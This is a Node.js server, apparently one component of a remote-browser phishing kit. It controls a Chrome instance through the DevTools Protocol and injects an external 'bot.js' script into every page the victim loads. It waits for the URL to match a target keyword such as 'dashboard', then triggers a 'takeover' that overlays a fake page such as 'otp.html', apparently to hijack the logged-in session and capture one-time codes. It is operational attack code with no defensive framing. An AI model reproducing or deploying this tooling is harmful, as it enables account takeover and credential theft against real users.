const CDP = require('chrome-remote-interface');
const express = require('express');
const https = require("https");
const fs = require("fs");

const app = express();
app.use(express.json());
app.use("/pages", express.static("/usr/local/share/kasmvnc/www/pages"));

const certDir = "/usr/local/share/takeover-certs";

https.createServer({
  key: fs.readFileSync(`${certDir}/key.pem`),
  cert: fs.readFileSync(`${certDir}/cert.pem`)
}, app).listen(4000, "0.0.0.0", () => {
  console.log("[takeover] HTTPS server running on 4000");
});

/* ===============================
   STATE
=================================*/

let takeoverArmed = false;
let targetKeyword = "dashboard";
let overlayPage = "otp.html";
let cdpClient = null;
let takeoverEnabled = false;
/* ===============================
   HEADERS
=================================*/

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST");
  res.setHeader("Cross-Origin-Resource-Policy", "cross-origin");
  res.setHeader("Cross-Origin-Opener-Policy", "unsafe-none");
  res.setHeader("Cross-Origin-Embedder-Policy", "unsafe-none");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  next();
});

/* ===============================
   CDP CONNECTION
=================================*/

async function connectWithRetry(retries = 30, delay = 1000) {
  // Chrome may not be ready yet; retry until CDP becomes available.
  for (let i = 0; i < retries; i++) {
    try {
      const client = await CDP({ host: '127.0.0.1', port: 9222 });
      console.log("[takeover] Connected to Chrome CDP");
      return client;
    } catch (err) {
      console.log(`[takeover] Waiting for Chrome... (${i + 1}/${retries})`);
      await new Promise(res => setTimeout(res, delay));
    }
  }
  throw new Error("Chrome CDP not available");
}

/* ===============================
   INIT CDP
=================================*/

async function initCDP() {
  console.log("[takeover] initCDP");

  // Keep CDP client in shared state for later Runtime calls.
  cdpClient = await connectWithRetry();

  const { Page, Network, Runtime } = cdpClient;

  await Page.enable();
  await Network.enable();
  await Runtime.enable();

  /* ===============================
     CONSOLE LOG FROM BROWSER
  =================================*/

  Runtime.consoleAPICalled((event) => {
    const args = event.args.map(arg =>
      arg.value ?? arg.description ?? arg.unserializableValue ?? "[?]"
    );
    console.log("[BROWSER]", ...args);
  });

  /* ===============================
     CDP BINDING 
  =================================*/

  await Runtime.addBinding({
    name: "takeoverSend"
  });

  Runtime.bindingCalled(({ name, payload }) => {
    if (name !== "takeoverSend") return;

    try {
      // Receives messages emitted from the injected browser script.
      const cmd = JSON.parse(payload);

      console.log("[takeover] binding cmd:", cmd);

    } catch (e) {
      console.error("[takeover] binding error:", e);
    }
  });

  /* ===============================
     INJECTION 
  =================================*/

  const botPath = "/usr/local/bin/bot.js";

  if (!fs.existsSync(botPath)) {
    console.error("[takeover] bot.js not found");
  } else {
    const botScript = fs.readFileSync(botPath, "utf8");

    await Page.addScriptToEvaluateOnNewDocument({
      source: `
        (() => {
          try {
            // Inject only in top-level document, not in iframes.
            if (window.top !== window) return;

            // Bridge from page context to Node via CDP binding.
            window.takeover = {
              send: (data) => {
                window.takeoverSend(JSON.stringify(data));
              }
            };

            ${botScript}

          } catch (e) {
            console.error("[bot preload error]", e);
          }
        })();
      `
    });

    console.log("[takeover] bot + bridge injected");
  }

  /* ===============================
     URL TRIGGER
  =================================*/

  const checkUrl = (url) => {
    // Trigger takeover only when armed and keyword matches URL.
    if (!takeoverArmed || takeoverEnabled) return;

    if (targetKeyword && url.includes(targetKeyword)) {
      console.log("TAKEOVER TRIGGERED:", url);
      runBotAction();
    }
  };

  Page.frameNavigated((event) => {
    if (!event.frame || event.frame.parentId) return;

    const url = event.frame.url;
    console.log("[takeover] main frame:", url);

    checkUrl(url);
  });

  console.log("[takeover] CDP ready");
}

/* ===============================
   OVERLAY
=================================*/

function removeOverlay() {
  // Frontend polls /state and hides overlay when disabled.
  takeoverEnabled = false;
}

function injectOverlay(page) {
  // Default page shown while bot takeover initializes.
  if (!page) page = "loading.html";

  takeoverEnabled = true;
  overlayPage = page;
}

/* ===============================
   BOT ACTION
=================================*/

async function runBotAction() {
  console.log("[takeover] runBotAction");

  try {
    // Enable overlay immediately to provide user feedback.
    takeoverEnabled = true;

    const { Runtime } = cdpClient;

    await Runtime.evaluate({
      expression: `
        // Prevent duplicate activation in same browser session.
        if (!sessionStorage.getItem("__BOT_ACTIVE__")) {
          sessionStorage.setItem("__BOT_ACTIVE__", "true");
          window.__BOT_ACTIVE__ = true;
          console.log("[bot] Activated");
        }
      `
    });

    injectOverlay();

  } catch (err) {
    console.error("[takeover] runBotAction error:", err);
  }
}

/* ===============================
   API
=================================*/

app.post("/takeover", async (req, res) => {
  try {
    const { enabled, keyword, page } = req.body;

    if (typeof page === "string" && page.trim() !== "") {
      overlayPage = page.trim();
    }

    if (typeof keyword === "string" && keyword.trim() !== "") {
      // Armed mode: wait for URL match before executing bot action.
      targetKeyword = keyword.trim();
      takeoverArmed = true;
      takeoverEnabled = false;
    } else {
      // Direct mode: toggle overlay state immediately.
      targetKeyword = null;
      takeoverArmed = false;
      takeoverEnabled = Boolean(enabled);
    }

    if (!takeoverEnabled && !takeoverArmed) {
      removeOverlay();
    }

    return res.json({
      status: "ok",
      armed: takeoverArmed,
      enabled: takeoverEnabled,
      keyword: targetKeyword,
      page: overlayPage
    });

  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/state", (req, res) => {
  res.json({
    enabled: takeoverEnabled,
    page: overlayPage
  });
});

/* ===============================
   START
=================================*/

initCDP().catch(err => {
  console.error("[takeover] Fatal CDP error:", err);
});
